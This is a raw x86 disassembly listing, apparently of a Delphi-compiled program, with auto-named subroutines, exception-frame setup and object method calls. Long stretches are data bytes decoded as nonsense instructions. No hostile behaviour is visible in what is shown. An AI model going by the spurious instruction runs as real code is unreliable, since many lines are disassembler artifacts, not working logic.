call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
pop edx
call sub_3aaf2ac
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x370 ]
mov esi [ eax + 0x48 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov [ eax + 0x390 ] esi
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x370 ]
mov esi [ eax + 0x4c ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov [ eax + 0x394 ] esi
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx r-xdata
mov eax [ ebx + 0x40 ]
call sub_3ae35c4
sub_3aeec9e
scasb [ edi ]
add eax [ eax ]
add [ eax ] al
add cl bh
int1
scasb [ edi ]
add esi esp
add eax [ eax ]
add [ edx + ebp ] dl
lodsb [ esi ]
add esi eax
cmp eax 0x5d5403a8
lodsb [ esi ]
add ebx [ eax + 0x5f ]
lodsb [ esi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax - 0x6b ]
lodsb [ esi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
add ebx [ eax + 0x63 ]
lodsb [ esi ]
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
xor [ edi - 0x54 ] ch
add esp esp
cmp ch [ eax - 0x5340fffd ]
add ecx eax
pop ebx
lodsb [ esi ]
add edi [ edx + eax * 4 - 0x7737fc55 ]
stosd [ edi ]
add edx [ eax + ecx * 4 ]
stosd [ edi ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax + 0x6403ab7d ]
imul ebp [ ebx + eax + sub_3ab7a0c ] 0xffffffa8
jmp r-xdata
cmpsb [ esi ] [ edi ]
add eax eax
pop edi
lodsb [ esi ]
add ebx [ eax - 0x73fc5478 ]
lodsb [ esi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add edi [ eax + 0x1c03ac61 ]
bound ebp [ ebx + eax + sub_3ac6358 ]
jo r-xdata
inc ebx
sub_3aeef9e
add eax [ eax ]
add [ eax + eax ] cl
or eax 0x6f447249
arpl [ ebp + 0x6d ] si
outsb
je r-xdata
add al bh
hlt
jae r-xdata
popad
pop edx
imul esi [ eax + 0x31 ] 0x3dc
or al 0x0
cmovns esi [ edx + 0x50 ]
popad
jae r-xdata
rol [ ebx ] 0x1
add [ eax ] al
or al 0x0
or al 0x49
jb r-xdata
js r-xdata
popad
add [ ecx ] dl
add [ eax - 0xe ] ah
scasb [ edi ]
add ecx [ edx ]
inc esi
outsd
jb r-xdata
popad
jae r-xdata
add [ esp + edi * 8 - 0x52 ] bl
add ecx [ edi ]
arpl [ edx + 0x62 ] sp
inc esp
jb r-xdata
jb r-xdata
cli
xor eax esp
add eax [ eax ]
add [ 0x614c0600 ] al
bound esp [ ebp + 0x6c ]
xor edx [ esi ]
jb r-xdata
inc ebx
jb r-xdata
jo r-xdata
popad
push esp
insd
jo r-xdata
js r-xdata
jbe r-xdata
jne r-xdata
jb r-xdata
jae r-xdata
jbe r-xdata
outsd
jae r-xdata
jb r-xdata
inc ebp
outsb
jbe r-xdata
popad
je r-xdata
scasb [ edi ]
add edx [ ebx ]
inc edx
popad
imul edi [ eax + 0x61 ] 0x71724172
add [ eax + 0x1103aef6 ] ah
add al dl
cmc
push edx
arpl [ gs : ebp + 0x6e ] sp
je r-xdata
aam 0x3
add [ eax ] al
or al 0x0
or cl [ ecx + 0x72 ]
inc ecx
jo r-xdata
jne r-xdata
jb r-xdata
popad
imul edi [ eax + 0x61 ] 0x71724172
pop edx
imul esi [ eax + 0x61 ] 0x73615072
je r-xdata
insb
imul edi [ edx + 0x61 ] 0x6c433172
je r-xdata
jne r-xdata
popad
insb
arpl [ gs : eax + edx ] si
xchg esp eax
sti
scasb [ edi ]
add ecx [ ecx ]
bound esi [ esi + ebp * 2 + 0x31 ]
inc ebx
add [ ebx + edi * 8 + 0x620903ae ] dl
je r-xdata
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0xfd74001a
scasb [ edi ]
add edx [ ebx ]
jb r-xdata
push ss
jo r-xdata
jne r-xdata
insb
popad
imul esp [ ecx + 0x72 ] 0x75717241
push ss
jno r-xdata
outsd
ja r-xdata
jns r-xdata
popad
je r-xdata
add al 0xaa
outsb
je r-xdata
scasb [ edi ]
add ecx [ edi ]
dec ecx
jb r-xdata
jb r-xdata
add [ ebx + esi * 8 + 0x491403ae ] dh
jbe r-xdata
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0xf2dc0016
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0xf9600016
insb
imul esp [ ebx + 0x6b ] 0xfa8c001a
scasb [ edi ]
add edx [ ebx ]
inc edx
inc ebx
insb
imul esi [ eax + 0x61 ] 0x71724172
add [ ecx + eax + 0x5a1203af ] bl
jbe r-xdata
inc ebx
pop ss
add [ esp + esi * 8 + 0x491003ae ] cl
jbe r-xdata
outsb
jbe r-xdata
imul esp [ ebx + 0x6b ] 0x19c0019
scasd [ edi ]
add edx [ edx ]
pop edx
xor [ ebx + 0x6c ] eax
jb r-xdata
jb r-xdata
add [ edi + 0x695a1203 ] ebp
jbe r-xdata
outsd
jb r-xdata
add [ ebx + eax + 0x460903af ] al
add [ edx + eax + 0x410f03af ] bh
je r-xdata
jno r-xdata
imul esi [ esi + 0x6f ] 0x696c4331
arpl [ ebx + 0x12 ] bp
add [ ecx + eax ] ch
imul esp [ ebx + 0x6b ] 0x3840010
scasd [ edi ]
add ecx [ ecx ]
inc esi
xor [ ebx + 0x6c ] eax
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
xor [ edx + 0x6c ] eax
inc ebx
insb
sbb [ eax ] al
mov al [ 0x1103aef6 ]
scasb [ edi ]
add ecx [ eax * 2 + 0x31746964 ]
dec ebx
shl ch 0x1
xor eax ebx
add eax [ eax ]
add [ eax + eax ] cl
or ecx [ ecx + 0x72 ]
push eax
popad
jae r-xdata
push ebp
idiv edi
call sub_3a64cb0
jmp r-xdata
xor edx eax
in al dx
scasb [ edi ]
add ebp [ ebx + ebp - 0x54 ]
add ebp [ eax ]
or al 0x46
imul ebp [ ebp + 0x5f ] 0x616e614d
test eax 0xaa274403
test eax 0xad449c03
add esp [ edi - 0x57 ]
add ebx [ eax ]
sub [ ecx - 0x528757fd ] ebp
add ebx [ esp + eax * 2 ]
jae r-xdata
scasb [ edi ]
add edx [ ecx ]
dec ecx
jae r-xdata
jb r-xdata
dec ecx
jne r-xdata
test eax 0xa9201003
add ebx [ esp + eax * 2 - 0x589bfc53 ]
test eax 0xa9291803
in al dx
shr [ ecx - 0x56320ffd ] 0x1
popad
jae r-xdata
push eax
xor al [ ebx + 0x6c ]
imul esp [ ebx + 0x6b ] 0xff50001a
scasb [ edi ]
add edx [ ebx ]
inc ebp
jb r-xdata
popad
insb
jpe r-xdata
jb r-xdata
jb r-xdata
xor al [ ebx + 0x6c ]
imul esp [ ebx + 0x6b ] 0xf48c0017
scasb [ edi ]
add edx [ eax ]
dec ecx
xor [ gs : ebx + 0x6c ] eax
popad
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0x1a00017
scasd [ edi ]
add edx [ eax ]
popad
jb r-xdata
jb r-xdata
scasd [ edi ]
add ecx [ ebx ]
push esp
imul ebp [ ebp + 0x65 ] 0x69543172
insd
jb r-xdata
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0x12c0012
scasb [ edi ]
add ecx [ edi ]
inc ecx
je r-xdata
stc
popad
jae r-xdata
imul esi [ esi + 0x6f ] 0x696c4331
arpl [ ebx + 0x17 ] bp
add [ eax + 0x1003af01 ] ah
imul esp [ ebx + 0x6b ] 0xfa28001a
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
pop edi
pop esi
pop ebx
pop ebp
retn
add [ ebp + 0x5b20040 ] cl
mov eax [ eax + 0x360 ]
call sub_3aaef04
retn
jo r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xf3b4001b
scasb [ edi ]
add edx [ ecx + ecx * 2 ]
add ebp [ eax + 0x1c03ad78 ]
inc esp
popad
jae r-xdata
push es
push esp
inc esi
outsd
je r-xdata
add eax [ eax + 0x1f ]
stosb [ edi ]
add ecx [ ebx - 0x510dc340 ]
add eax [ edi ]
push es
push esp
inc esi
outsd
jb r-xdata
popad
push edx
arpl [ gs : ebp + 0x6e ] sp
jo r-xdata
outsd
arpl [ ebp + 0x6d ] si
sbb [ eax ] eax
dec eax
[ edi ]
jb r-xdata
popad
pop edx
imul esi [ eax + 0x31 ] 0x63696c43
imul edx [ esi ] 0x0
fdivr st2
adc [ ecx + 0x72 ] ecx
push eax
jne r-xdata
adc [ ecx + 0x72 ] cl
push eax
jne r-xdata
add eax [ edx + ebp * 4 ]
int 0xa9
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xf2700016
jb r-xdata
push 0x69460c00
insb
pop edi
popad
inc ebx
mov eax eax
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x38c ]
mov edx [ eax ]
call [ edx + 0xf0 ]
xor eax eax
push ebp
push sub_3aef2ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x3e4 ]
mov edx r-xdata
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ecx [ 0xffffffffad60bc00 ]
add ebp eax
mov esp 0xd0ec03aa
test eax 0xa9cdf003
jo r-xdata
sbb al 0x44
imul esp [ ebx + 0x6b ] 0xf4200018
xor [ ebx + 0x6c ] eax
push esp
insd
scasb [ edi ]
add ecx [ edi ]
dec ecx
inc esp
daa
stosb [ edi ]
jo r-xdata
sbb [ eax ] al
and ah dh
je r-xdata
add edx [ edx ]
dec ecx
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xf3480019
scasb [ edi ]
add [ edx + 0x60808b05 ] dh
add eax [ eax ]
add al ch
xchg edi eax
cld
sti
popad
je r-xdata
dec ebp
popad
outsb
popad
jb r-xdata
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0x6f465406
sub_3aef021
scasb [ edi ]
add ecx [ edi ]
push eax
outsd
jo r-xdata
jb r-xdata
jo r-xdata
packsswb mm4 [ edx + 0x62 ]
push esp
imul ebp [ ebp + 0x65 ] 0xbc001672
imul ebx [ edx ] 0x0
je r-xdata
outsb
jne r-xdata
js r-xdata
jbe r-xdata
pop edx
imul esi [ eax + 0x61 ] 0x73615072
je r-xdata
insb
imul edi [ edx + 0x61 ] 0x6c433172
add [ ebp + edi * 8 - 0x52 ] dh
add edx [ ebx ]
inc ebp
outsb
jbe r-xdata
scasb [ edi ]
add [ eax ] ch
cli
push eax
outsd
jo r-xdata
jne r-xdata
jb r-xdata
popad
imul edi [ eax + 0x61 ] 0x71724172
jae r-xdata
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0xf2dc0016
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0xf9600016
insb
imul esp [ ebx + 0x6b ] 0xfa8c001a
scasb [ edi ]
add edx [ ebx ]
inc edx
inc ebx
insb
insb
popad
jb r-xdata
jbe r-xdata
add ch [ edi + 0x74410f03 ]
jne r-xdata
jo r-xdata
add al 0xaa
outsb
je r-xdata
scasb [ edi ]
add ecx [ edi ]
dec ecx
jb r-xdata
jb r-xdata
add [ ebx + esi * 8 + 0x491403ae ] dh
jbe r-xdata
popad
insb
arpl [ gs : eax + edx ] si
xchg esp eax
sti
scasb [ edi ]
add ecx [ ecx ]
bound esi [ esi + ebp * 2 + 0x31 ]
inc ebx
scasb [ edi ]
add edx [ ecx ]
dec ecx
jae r-xdata
jb r-xdata
popad
insb
jpe r-xdata
jb r-xdata
inc esp
jb r-xdata
push ss
add [ esp + edi * 8 - 0x52 ] bl
add ecx [ edi ]
arpl [ edx + 0x62 ] sp
pop ss
add [ esp + esi * 8 + 0x491003ae ] cl
jbe r-xdata
outsd
jae r-xdata
jb r-xdata
add [ ebx + edi * 8 + 0x620903ae ] dl
je r-xdata
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0xfd74001a
scasb [ edi ]
add edx [ ebx ]
inc edx
popad
imul edi [ eax + 0x61 ] 0x71724172
jne r-xdata
add [ eax + 0x1103aef6 ] ah
add al dl
cmc
scasb [ edi ]
add ecx [ eax * 2 + 0x31746964 ]
dec ebx
jns r-xdata
push ebp
idiv edi
call sub_3a64cb0
jmp r-xdata
xor edx eax
in al dx
scasb [ edi ]
add ebp [ ebx + ebp - 0x54 ]
add ebp [ eax ]
or al 0x46
imul ebp [ ebp + 0x5f ] 0x616e614d
test eax 0xaa274403
test eax 0xad449c03
add esp [ edi - 0x57 ]
add ebx [ eax ]
sub [ ecx - 0x528757fd ] ebp
add ebx [ esp + eax * 2 ]
jae r-xdata
jb r-xdata
dec ecx
jne r-xdata
test eax 0xa9201003
add ebx [ esp + eax * 2 - 0x589bfc53 ]
test eax 0xa9291803
in al dx
shr [ ecx - 0x56320ffd ] 0x1
popad
jae r-xdata
push eax
xor al [ ebx + 0x6c ]
imul esp [ ebx + 0x6b ] 0xff50001a
scasb [ edi ]
add edx [ ebx ]
inc ebp
jbe r-xdata
inc ebx
add ebp [ eax + 0x1c03ad78 ]
inc esp
popad
jae r-xdata
push es
push esp
inc esi
outsd
je r-xdata
jo r-xdata
outsd
arpl [ ebp + 0x6d ] si
sbb [ eax ] eax
dec eax
[ edi ]
xor [ gs : ebx + 0x6c ] eax
popad
jb r-xdata
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0x1a00017
scasd [ edi ]
add edx [ eax ]
jo r-xdata
jne r-xdata
outsb
jbe r-xdata
imul esp [ ebx + 0x6b ] 0x19c0019
scasd [ edi ]
add edx [ edx ]
pop edx
imul esi [ eax + 0x61 ] 0x71724172
xor [ ebx + 0x6c ] eax
jno r-xdata
outsd
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add [ ebp + 0x5b20040 ] cl
mov eax [ eax + 0x360 ]
call sub_3aaef04
retn
jo r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xf3b4001b
scasb [ edi ]
add edx [ ecx + ecx * 2 ]
add eax [ eax + 0x1f ]
stosb [ edi ]
add ecx [ ebx - 0x510dc340 ]
add eax [ edi ]
push es
push esp
inc esi
outsd
jb r-xdata
popad
push edx
arpl [ gs : ebp + 0x6e ] sp
popad
jb r-xdata
xor al [ ebx + 0x6c ]
imul esp [ ebx + 0x6b ] 0xf48c0017
scasb [ edi ]
add edx [ eax ]
dec ecx
jb r-xdata
push 0x69460c00
insb
pop edi
popad
inc ebx
mov eax eax
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x38c ]
mov edx [ eax ]
call [ edx + 0xf0 ]
xor eax eax
push ebp
push sub_3aef2ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x3e4 ]
mov edx r-xdata
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
add eax [ edx + ebp * 4 ]
xor ecx [ 0xffffffffad60bc00 ]
add ebp eax
mov esp 0xd0ec03aa
test eax 0xa9cdf003
jo r-xdata
push esp
insd
scasb [ edi ]
add ecx [ edi ]
dec ecx
jb r-xdata
popad
pop edx
imul esi [ eax + 0x31 ] 0x63696c43
imul edx [ esi ] 0x0
fdivr st2
jb r-xdata
jb r-xdata
add [ edi + 0x695a1203 ] ebp
jbe r-xdata
jno r-xdata
imul esi [ esi + 0x6f ] 0x696c4331
arpl [ ebx + 0x12 ] bp
add [ ecx + eax ] ch
imul esp [ ebx + 0x6b ] 0x3840010
scasd [ edi ]
add ecx [ ecx ]
inc esi
xor [ ebx + 0x6c ] eax
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
xor [ edx + 0x6c ] eax
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xfa28001a
sbb [ eax ] al
mov al [ 0x1103aef6 ]
int 0xa9
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xf2700016
sbb al 0x44
imul esp [ ebx + 0x6b ] 0xf4200018
xor [ ebx + 0x6c ] eax
jb r-xdata
je r-xdata
add edx [ edx ]
dec ecx
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xf3480019
scasb [ edi ]
inc esp
daa
stosb [ edi ]
jo r-xdata
jb r-xdata
scasd [ edi ]
add ecx [ ebx ]
push esp
imul ebp [ ebp + 0x65 ] 0x69543172
insd
jb r-xdata
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0x12c0012
jae r-xdata
imul esi [ esi + 0x6f ] 0x696c4331
arpl [ ebx + 0x17 ] bp
add [ eax + 0x1003af01 ] ah
outsd
jb r-xdata
add [ ebx + eax + 0x460903af ] al
add [ edx + eax + 0x410f03af ] bh
je r-xdata
adc [ ecx + 0x72 ] ecx
push eax
jne r-xdata
add [ edx + 0x60808b05 ] dh
add eax [ eax ]
add al ch
xchg edi eax
cld
sti
popad
je r-xdata
adc [ ecx + 0x72 ] cl
push eax
jne r-xdata
scasb [ edi ]
add ecx [ edi ]
inc ecx
je r-xdata
stc
popad
sbb [ eax ] al
and ah dh
dec ebp
popad
outsb
popad
jb r-xdata
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0x6f465406
sub_3aef2db
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x38c ]
mov edx [ eax ]
call [ edx + 0xf0 ]
xor eax eax
push ebp
push sub_3aef31a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x3e4 ]
mov edx r-xdata
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_3aef32b
sub_3aef347
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x38c ]
mov edx [ eax ]
call [ edx + 0xf0 ]
xor eax eax
push ebp
push sub_3aef386
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x3e4 ]
mov edx r-xdata
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_3aef397
sub_3aef3b3
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x38c ]
mov edx [ eax ]
call [ edx + 0xf0 ]
xor eax eax
push ebp
push sub_3aef3f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x3e4 ]
mov edx r-xdata
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_3aef403
sub_3aef41f
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x38c ]
mov edx [ eax ]
call [ edx + 0xf0 ]
xor eax eax
push ebp
push sub_3aef45e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x3e4 ]
mov edx r-xdata
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_3aef46f
sub_3aef477
dec [ esi ]
add [ eax ] al
add [ esp + edi * 2 ] bh
dec ecx
jb r-xdata
push edi
idiv edi
jmp sub_3aef4db
popad
jb r-xdata
add [ eax ] al
add [ esp + edi * 2 ] bh
dec ecx
jb r-xdata
jl r-xdata
mov eax [ ebx + 0x360 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x4 ]
mov edx 0x5
popad
jb r-xdata
pop ecx
mov [ fs : eax ] edx
jmp sub_3aef4db
xor al 0x3c
cmp al 0x7c
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x38c ]
mov edx [ eax ]
call [ edx + 0xf0 ]
xor eax eax
push ebp
push sub_3aef4ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x3e4 ]
mov edx r-xdata
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
mov eax [ ebx + 0x398 ]
mov eax [ eax + 0x34 ]
mov edx 0x2
call sub_3aa66a4
xor edx edx
call sub_3aa65c0
mov eax [ ebx + 0x398 ]
mov eax [ eax + 0x34 ]
mov edx 0x2
call sub_3aa66a4
mov dl 0x1
call sub_3aa65c0
jmp r-xdata
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
add [ eax ] al
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jo r-xdata
xor [ esp + edi ] bh
jl r-xdata
push sub_3aef5ba
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov [ eax ] edx
sti
push [ ebx ]
shr al cl
test [ eax - 0x5 ] esi
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_3aef5b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x360 ]
mov edx [ eax ]
call [ edx + 0xdc ]
test eax eax
jge r-xdata
mov eax [ ebx + 0x398 ]
mov eax [ eax + 0x34 ]
mov edx 0x2
call sub_3aa66a4
xor edx edx
call sub_3aa65c0
jmp r-xdata
sub_3aef5d0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_3aef66d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_3aef63e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ecx ] 0xd
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x38c ]
call sub_3aafb88
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3e4 ]
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aef674
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3aef8b6
lea eax [ ebp - 0x44 ]
call sub_3a652a0
lea eax [ ebp - 0x40 ]
call sub_3a652a0
lea eax [ ebp - 0x3c ]
mov edx 0x7
call sub_3a652c4
lea eax [ ebp - 0x20 ]
call sub_3a652a0
lea eax [ ebp - 0x1c ]
call sub_3a652a0
lea eax [ ebp - 0x18 ]
call sub_3a652a0
lea eax [ ebp - 0x10 ]
call sub_3a652a0
lea eax [ ebp - 0xc ]
call sub_3a652a0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3aef957
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] bl
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_3aef9f7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_3aef9c8
push [ fs : eax ]
mov [ fs : eax ] esp
push r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x38c ]
call sub_3aafb88
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3e4 ]
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aef9fe
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3aefa8c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3aefb3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx r-xdata
mov eax [ ebx + 0x3e0 ]
call sub_3aafbb8
mov eax [ ebx + 0x360 ]
call sub_3adeb50
mov ecx [ eax + 0x24 ]
lea eax [ ebx + 0x3ec ]
mov edx [ ebx + 0x3e8 ]
call sub_3a655b8
push r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x38c ]
call sub_3aafb88
push [ ebp - 0x8 ]
push r-xdata
mov eax [ ebx + 0x360 ]
call sub_3adeb50
push [ eax + 0x24 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x5
call sub_3a65634
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3e4 ]
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aefb41
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3aefece
lea eax [ ebp - 0x2c ]
call sub_3a652a0
lea eax [ ebp - 0x28 ]
call sub_3a652a0
lea eax [ ebp - 0x24 ]
call sub_3a652a0
lea eax [ ebp - 0x20 ]
call sub_3a652a0
lea eax [ ebp - 0x1c ]
call sub_3a652a0
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_3a652c4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3af00aa
lea eax [ ebp - 0x2c ]
call sub_3a652a0
lea eax [ ebp - 0x28 ]
call sub_3a652a0
lea eax [ ebp - 0x24 ]
call sub_3a652a0
lea eax [ ebp - 0x20 ]
call sub_3a652a0
lea eax [ ebp - 0x1c ]
call sub_3a652a0
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_3a652c4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3af0171
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x37c ]
xor edx edx
call sub_3ad96ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x384 ]
xor edx edx
call sub_3a9c298
call sub_3a64cb0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3af01a0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_3af0262
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_3af0233
push [ fs : eax ]
mov [ fs : eax ] esp
push r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x38c ]
call sub_3aafb88
push [ ebp - 0x8 ]
mov eax [ ebx + 0x360 ]
call sub_3adeb50
push [ eax + 0x24 ]
push r-xdata
push r-xdata
mov eax [ ebx + 0x360 ]
call sub_3adeb50
push [ eax + 0x24 ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x8
call sub_3a65634
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3e4 ]
call sub_3ae35c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af0269
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af041a
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
xor ecx ecx
mov edx 0x4
mov ebx [ eax ]
call [ ebx + 0x24 ]
call sub_3a64cb0
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af0458
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
sub_3af0460
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3af0491
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af0498
retn
mov eax rw-data
call sub_3a652a0
sub_3af04a0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
add eax 0x6d803af
scasd [ edi ]
add edi esi
add eax 0x66c03af
scasd [ edi ]
add eax [ eax ]
add [ eax ] al
add [ edi - 0x7bfc50fa ] dh
add eax [ eax ]
add [ edx + ebp ] dl
lodsb [ esi ]
add esi eax
cmp eax 0x5d5403a8
lodsb [ esi ]
add ebx [ eax + 0x5f ]
lodsb [ esi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax - 0x6b ]
lodsb [ esi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
